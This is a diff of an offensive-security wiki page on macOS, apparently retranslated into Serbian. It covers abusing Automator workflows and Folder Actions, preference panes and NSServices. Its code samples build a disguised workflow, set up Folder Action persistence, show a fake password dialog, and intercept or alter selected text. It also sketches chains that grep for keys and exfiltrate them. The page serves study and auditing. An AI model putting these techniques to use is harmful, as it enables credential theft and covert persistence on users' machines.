@@ -4,20 +4,20 @@
 
 ## Automator Actions & Workflows
 
-### Basic Information
+### Osnovne informacije
 
-**Automator** je vizuelni alat za automatizaciju u macOS-u. On izvršava **workflows** (`.workflow` bundles) sastavljene od **actions** (`.action` bundles). Automator takođe pokreće integraciju za **Folder Actions**, **Quick Actions** i **Shortcuts**. Na modernom macOS-u, workflows mogu takođe biti **imported into Shortcuts**, tako da se ista zlonamerna logika može pojaviti kao Finder Quick Action, user service u `~/Library/Services/`, ili shortcut zasnovan na legacy Automator actions.
+**Automator** je macOS alatka za vizuelnu automatizaciju. Izvršava **workflows** (`.workflow` bundles) sastavljene od **actions** (`.action` bundles). Automator takođe pokreće integraciju sa **Folder Actions**, **Quick Actions** i **Shortcuts**. Na novijim verzijama macOS-a, workflows se mogu i **importovati u Shortcuts**, pa se ista zlonamerna logika može pojaviti kao Finder Quick Action, user service u `~/Library/Services/` ili shortcut zasnovan na legacy Automator actions.
 
-Automator actions su **plugins** učitani u Automator runtime kada se workflow izvrši. Oni mogu:
-- Izvršavati proizvoljne shell skripte
-- Obrađivati fajlove i podatke
-- Interagovati sa aplikacijama preko AppleScript
-- Lančati se za složenu automatizaciju
+Automator actions su **plugins** koji se učitavaju u Automator runtime kada se workflow izvršava. One mogu da:
+- Izvršavaju proizvoljne shell scripts
+- Obrađuju files i data
+- Interaguju sa applications pomoću AppleScript-a
+- Povezuju se radi složene automatizacije
 
-### Why This Matters
+### Zašto je ovo važno
 
 > [!WARNING]
-> Automator workflows mogu biti **social-engineered** da se pokrenu — izgledaju kao obični dokument fajlovi. `.workflow` bundle može da sadrži ugrađene shell komande koje se izvršavaju kada se workflow pokrene. U kombinaciji sa Folder Actions, oni pružaju **automatic persistence** koja se aktivira na događaje vezane za fajlove. Nedavne Gatekeeper ispravke takođe su pokazale da **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) moraju biti tretirane kao izvršni sadržaj, a ne bezazleni podaci.
+> Automator workflows mogu biti **social-engineered** za izvršavanje — izgledaju kao obične document files. `.workflow` bundle može sadržati ugrađene shell commands koje se izvršavaju kada se workflow pokrene. U kombinaciji sa Folder Actions, omogućavaju **automatic persistence** koja se aktivira na file events. Nedavne Gatekeeper ispravke su takođe pokazale da se **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) moraju tretirati kao izvršni sadržaj, a ne kao bezopasni data.
 
 ### Discovery
 ```bash
@@ -43,9 +43,9 @@ JOIN executable_handlers eh ON e.id = eh.executable_id
 JOIN handlers h ON eh.handler_id = h.id
 WHERE h.handler_type = 'automator_action';"
 ```
-### Napad: Social-Engineered Workflow
+### Napad: Workflow zasnovan na socijalnom inženjeringu
 
-`.workflow` bundle izgleda kao normalna datoteka dokumenta za većinu korisnika:
+`.workflow` paket većini korisnika izgleda kao obična datoteka dokumenta:
 ```bash
 # Create a workflow programmatically
 mkdir -p /tmp/Evil.workflow/Contents
@@ -78,7 +78,7 @@ cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
 </plist>
 PLIST
 ```
-### Napad: Folder Action Persistence
+### Attack: Folder Action Persistence
 
 Folder Actions automatski izvršavaju workflow kada se fajlovi dodaju u nadgledani folder:
 ```bash
@@ -99,7 +99,7 @@ end tell'
 # Users can be tricked into installing a Folder Action through a .workflow double-click
 ```
 > [!CAUTION]
-> Folder Actions traju kroz reboot-ove i izvršavaju se tiho. Folder Action na `~/Downloads` znači da **svaki preuzeti fajl pokreće tvoj payload** — uključujući fajlove iz Safari, Chrome, AirDrop i email attachmente. Takođe imaj na umu da `System Events` može da registruje Folder Actions koji upućuju na skripte van podrazumevanih lokacija `~/Library/Scripts/Folder Action Scripts`, što čini pretragu za loose-path korisnom. Za povezane TCC implikacije, proveri [the TCC page](../macos-security-protections/macos-tcc/README.md).
+> Folder Actions ostaju aktivne nakon ponovnog pokretanja sistema i izvršavaju se nečujno. Folder Action na `~/Downloads` znači da **svaka preuzeta datoteka pokreće vaš payload** — uključujući datoteke iz aplikacija Safari i Chrome, kao i datoteke prenete putem AirDrop-a i priloge e-pošte. Takođe imajte na umu da `System Events` može da registruje Folder Actions koje upućuju na skripte izvan podrazumevanih lokacija `~/Library/Scripts/Folder Action Scripts`, zbog čega se isplati tražiti i putanje koje nisu na očekivanim mestima. Za povezane TCC implikacije pogledajte [TCC page](../macos-security-protections/macos-tcc/README.md).
 
 ---
 
@@ -107,15 +107,15 @@ end tell'
 
 ### Basic Information
 
-Preference panes (`.prefPane` bundles) su pluginovi učitani iz **System Settings** (ranije System Preferences). Oni pružaju UI panele za konfiguraciju sistemskih ili third-party funkcija. Na starijim sistemima učitavani su direktno od strane `System Preferences`; na novijim izdanjima third-party pane-ovi su često posredovani preko **legacy loader XPC service** pokrenutog iz System Settings.
+Preference panes (`.prefPane` bundles) su plugin-ovi koje učitava **System Settings** (ranije System Preferences). Oni pružaju UI panele za konfiguraciju sistemskih funkcija ili funkcija trećih strana. Na starijim sistemima učitavao ih je direktno `System Preferences`; u novijim izdanjima pane-ove trećih strana obično prosleđuje **legacy loader XPC service** koji pokreće System Settings.
 
 ### Why This Matters
 
-- Preference panes se izvršavaju u **trusted host process**-u koji pokreće System Settings / System Preferences
-- Na modernim sistemima taj host može biti **`legacyLoader` XPC service**, pa je važna granica i dalje **trusted Apple UI process -> third-party code loading**
-- Third-party preference panes nasleđuju **host process security context** i user trust vezan za taj UI
-- Korisnici instaliraju preference panes tako što ih **double-click**-uju — lako za social engineering
-- Jednom instalirani, oni **persist** i učitavaju se svaki put kada System Settings otvori taj panel
+- Preference panes se izvršavaju u **trusted host process-u** koji pokreće System Settings / System Preferences
+- Na modernim sistemima taj host može biti **`legacyLoader` XPC service**, tako da je važna granica i dalje **trusted Apple UI process -> učitavanje koda treće strane**
+- Preference panes trećih strana nasleđuju **security context host process-a** i korisničko poverenje povezano sa tim UI-jem
+- Korisnici instaliraju preference panes tako što ih **dvaput kliknu** — što je pogodno za social engineering
+- Nakon instalacije, one **ostaju prisutne** i učitavaju se svaki put kada System Settings otvori taj panel
 
 ### Discovery
 ```bash
@@ -139,9 +139,9 @@ JOIN executable_handlers eh ON e.id = eh.executable_id
 JOIN handlers h ON eh.handler_id = h.id
 WHERE h.handler_type = 'preference_pane';"
 ```
-### Napad: Hijacking privilegovanog konteksta
+### Napad: Otmica konteksta privilegija
 
-Zlonamerna preference pane nasleđuje bezbednosni kontekst **hosta panela** (istorijski `System Preferences`, na novijim verzijama često `legacyLoader` helper pokrenut od strane `System Settings`):
+Zlonamerni panel za podešavanja nasleđuje **bezbednosni kontekst hosta panela** (istorijski `System Preferences`, a u novijim verzijama često pomoćni proces `legacyLoader` koji pokreće `System Settings`):
 ```objc
 // Preference pane principal class
 @interface MaliciousPrefPane : NSPreferencePane
@@ -162,7 +162,7 @@ AXUIElementRef systemWide = AXUIElementCreateSystemWide();
 }
 @end
 ```
-### Napad: Persistence via Installation
+### Napad: Persistence putem instalacije
 ```bash
 # Install a preference pane (user-level, no admin required)
 cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/
@@ -173,9 +173,9 @@ sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/
 # The pane loads every time the user opens System Settings and navigates to it
 # For better persistence, set it as the default pane
 ```
-### Napad: UI Phishing
+### Attack: UI Phishing
 
-Preference pane može da oponaša legitimne sistemske UI panele kako bi **phishovao kredencijale**:
+Preference pane može oponašati legitimne sistemske UI panele kako bi **phishovao kredencijale**:
 ```objc
 // Display a fake authentication dialog
 NSAlert *alert = [[NSAlert alloc] init];
@@ -195,21 +195,21 @@ NSString *password = passwordField.stringValue;
 
 ## NSServices
 
-### Basic Information
+### Osnovne informacije
 
-**NSServices** omogućavaju aplikacijama da pružaju funkcionalnost drugim aplikacijama kroz **Services menu** (desni klik → Services). Kada korisnik izabere tekst ili podatke i pokrene service, izabrani podaci se **šalju service provider-u** na obradu.
+**NSServices** omogućava aplikacijama da pruže funkcionalnost drugim aplikacijama putem **Services menija** (desni klik → Services). Kada korisnik izabere tekst ili podatke i pozove service, izabrani podaci se **šalju service provideru** na obradu.
 
-Services se deklarišu u `Info.plist` aplikacije pod `NSServices` ključem i registruju sa pasteboard serverom (`pbs`). macOS takođe čuva **service cache** i **restriction policy** koji određuju koji su servisi vidljivi i da li sandboxed caller-i treba da dobiju dodatno upozorenje.
+Services se definišu u `Info.plist` datoteci aplikacije pod ključem `NSServices` i registruju na pasteboard serveru (`pbs`). macOS takođe održava **service cache** i **restriction policy**, koji određuju koji su services vidljivi i da li sandboxed callers treba da dobiju dodatno upozorenje.
 
-### Why This Matters
+### Zašto je ovo važno
 
-- Services primaju **cross-application data flow** — izabrani tekst iz bilo koje aplikacije se šalje service-u
-- Malicious service presreće podatke iz password manager-a, email klijenata, financial app-ova
-- Services mogu da **vrate modifikovane podatke** pozivajućoj aplikaciji (man-in-the-middle nad selection operacijama)
-- Imena servisa mogu biti napravljena da deluju legitimno ("Format Text", "Encrypt Selection", "Share")
-- Opcioni `NSRestricted` flag je bezbednosno relevantan: service označen kao unrestricted može biti pozvan od strane sandboxed aplikacije bez upozorenja koje macOS prikazuje za escape-prone services
+- Services primaju **međuprocesni tok podataka** — izabrani tekst iz bilo koje aplikacije šalje se serviceu
+- Malicious service može da prikuplja podatke iz password managera, email klijenata i financial aplikacija
+- Services mogu da **vrate izmenjene podatke** pozivajućoj aplikaciji (man-in-the-middle pri operacijama nad selekcijom)
+- Imena services mogu biti napravljena tako da deluju legitimno ("Format Text", "Encrypt Selection", "Share")
+- Opciona `NSRestricted` zastavica je bezbednosno relevantna: service označen kao unrestricted može biti pozvan iz sandboxed aplikacije bez upozorenja koje macOS prikazuje za services podložne escape-u<sup>[2]</sup>
 
-### Discovery
+### Otkrivanje
 ```bash
 # List all registered services
 /System/Library/CoreServices/pbs -dump_pboard 2>/dev/null
@@ -236,7 +236,7 @@ JOIN executable_handlers eh ON e.id = eh.executable_id
 JOIN handlers h ON eh.handler_id = h.id
 WHERE h.handler_type = 'service';"
 ```
-### Napad: Data Interception Service
+### Napad: Servis za presretanje podataka
 ```xml
 <!-- Info.plist NSServices declaration -->
 <key>NSServices</key>
@@ -277,9 +277,9 @@ NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];
 [pboard setString:selectedText forType:NSPasteboardTypeString];
 }
 ```
-### Napad: Modifikacija podataka (Man-in-the-Middle)
+### Napad: Izmena podataka (Man-in-the-Middle)
 
-Servis može **modifikovati vraćene podatke** dok izgleda kao da pruža legitimnu funkciju:
+Servis može da **izmeni vraćene podatke** dok naizgled pruža legitimnu funkciju:
 ```objc
 // A "Secure Encrypt" service that actually intercepts and modifies data
 - (void)secureEncrypt:(NSPasteboard *)pboard
@@ -297,35 +297,35 @@ withString:@"attacker-account"];
 [pboard setString:modified forType:NSPasteboardTypeString];
 }
 ```
-### Restricted Services & Modern Abuse
+### Restricted Services i savremena zloupotreba
 
-Apple podržava opcioni `NSRestricted` boolean po definiciji servisa. Ako je podešen, macOS upozorava sandboxed pozivaoce jer servis može da im pomogne da **escape sandbox or privacy boundaries**. Iz ofanzivne perspektive, ovo daje dve korisne audit putanje:
+Apple podržava opcionu Boolean vrednost `NSRestricted` za svaku definiciju servisa. Ako je postavljena, macOS upozorava sandboxovane pozivaoce jer servis može da im pomogne da **zaobiđu sandbox ili granice privatnosti**. Iz ofanzivne perspektive, ovo pruža dva korisna pravca za audit:
 
-- Traži **third-party services not marked as restricted** čak i kada proxy-ju Apple Events, pristup fajlovima ili druge privilegovane akcije
-- Traži **high-value built-in services** sa jakim entitlements (na primer, servise izložene preko Script Editor ili Finder-backed helpers) i proveri da li je korisnička interakcija dovoljna da ih pretvori u data-access primitive
+- Potražite **third-party servise koji nisu označeni kao restricted**, iako prosleđuju Apple Events, pristup fajlovima ili druge privilegovane radnje
+- Potražite **ugrađene servise visoke vrednosti** sa snažnim entitlements (na primer, servise koje izlažu Script Editor ili pomoćni procesi povezani sa Finder-om) i proverite da li je interakcija korisnika dovoljna da ih pretvori u primitive za pristup podacima
 
-Dobar noviji primer je **CVE-2022-48574**, gde je Services mehanizam mogao da se zloupotrebi za pristup **TCC-protected user files without the expected confirmation flow**. Buba je ispravljena, ali tehnika ostaje korisna za threat modeling: svaki servis koji prosleđuje pristup fajlovima ili automation zahteve u ime pozivaoca zaslužuje istu proveru.
-
----
-
-## Recent Security Notes
-
-- **Quick Actions are executable content**: Apple je 2024. ispravio Gatekeeper bypass gde je app-bundled Automator Quick Action mogao da se izvrši bez normalne procene. Kada auditiraš aplikacije, pregledaj `Contents/PlugIns/*.workflow/Contents/document.wflow` baš kao što bi pregledao helper skripte ili login items. Pogledaj [the Gatekeeper page](../macos-security-protections/macos-gatekeeper.md).
-- **Shortcuts can inherit legacy Automator behavior**: Apple je takođe dodao dodatni user-consent prompt nakon što su third-party shortcuts pronađeni kako koriste **legacy Automator action** da šalju Apple Events bez očekivanog permission flow-a. Uvezeni workflows i shortcut bundles treba pregledati zbog `Run AppleScript`, `Run Shell Script` i sličnih bridge actions. Pogledaj [the TCC page](../macos-security-protections/macos-tcc/README.md).
-- **Automator is still a live privacy boundary**: Apple je 2025. objavio još jednu Automator ispravku za pristup protected user data. Čak i ako je Automator legacy površina, tretiraj svaki workflow runner, Quick Action host ili automation bridge kao aktuelnu attack surface, a ne kao mrtav kod.
+Dobar noviji primer je **CVE-2022-48574**, gde je Services mehanizam mogao da se zloupotrebi za pristup **TCC-zaštićenim korisničkim fajlovima bez očekivanog toka potvrde**. Greška je otklonjena, ali tehnika je i dalje korisna za threat modeling: svaki servis koji u ime pozivaoca prosleđuje zahteve za pristup fajlovima ili automation zahteve zaslužuje istu pažnju.<sup>[2]</sup>
 
 ---
 
-## Cross-Technique Attack Chains
+## Novije bezbednosne napomene
 
-### Automator Folder Action → Credential Harvesting
+- **Quick Actions su izvršni sadržaj**: Apple je 2024. otklonio Gatekeeper bypass kod kojeg je Automator Quick Action upakovan u aplikaciju mogao da se pokrene bez uobičajene procene. Prilikom audita aplikacija, pregledajte `Contents/PlugIns/*.workflow/Contents/document.wflow` na isti način kao pomoćne skripte ili login items. Pogledajte [stranicu o Gatekeeper-u](../macos-security-protections/macos-gatekeeper.md).<sup>[1]</sup>
+- **Shortcuts mogu naslediti legacy Automator ponašanje**: Apple je takođe dodao dodatni prompt za saglasnost korisnika nakon što je utvrđeno da su third-party shortcuts koristili **legacy Automator action** za slanje Apple Events bez očekivanog toka dozvola. Uvezene workflows i shortcut bundles treba pregledati u potrazi za `Run AppleScript`, `Run Shell Script` i sličnim bridge actions. Pogledajte [TCC stranicu](../macos-security-protections/macos-tcc/README.md).
+- **Automator je i dalje aktivna granica privatnosti**: Apple je 2025. objavio novu ispravku za Automator koja se odnosi na pristup zaštićenim korisničkim podacima. Čak i ako je Automator legacy površina, svaki workflow runner, Quick Action host ili automation bridge tretirajte kao aktuelnu attack surface, a ne kao neaktivan kod.
+
+---
+
+## Lanci napada koji kombinuju tehnike
+
+### Automator Folder Action → prikupljanje akreditiva
 ```
 1. Install Folder Action on ~/Downloads
 2. Workflow scans every downloaded file for credentials/keys
 3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
 4. Exfiltrate findings
 ```
-### Preference Pane → TCC Eskalacija
+### Okno za podešavanja → TCC eskalacija
 ```
 1. Distribute malicious prefPane (social engineering)
 2. User double-clicks → installed in ~/Library/PreferencePanes/
@@ -333,7 +333,7 @@ Dobar noviji primer je **CVE-2022-48574**, gde je Services mehanizam mogao da se
 4. Inherits the host process trust and any useful entitlements / TCC posture
 5. Access protected data, control other apps, or phish from a trusted Apple UI
 ```
-### NSService → Krađa Password Manager-a
+### NSService → Krađa lozinki iz Password Manager-a
 ```
 1. Register a service named "Secure Copy"
 2. User selects password in password manager
@@ -341,9 +341,9 @@ Dobar noviji primer je **CVE-2022-48574**, gde je Services mehanizam mogao da se
 4. Service receives the password text
 5. Exfiltrate while placing it on clipboard normally
 ```
-## References
+## Reference
 
-* [Apple — About the security content of macOS Ventura 13.7, Sonoma 14.7, and Sequoia 15](https://support.apple.com/en-us/121238)
-* [Moonlock — How the NSServices exploit worked on macOS](https://moonlock.com/nsservices-macos)
+- [1] [Apple — O bezbednosnom sadržaju macOS Ventura 13.7, Sonoma 14.7 i Sequoia 15](https://support.apple.com/en-us/121238)
+- [2] [Moonlock — Kako je NSServices exploit funkcionisao na macOS-u](https://moonlock.com/nsservices-macos)
 
 {{#include ../../../banners/hacktricks-training.md}}
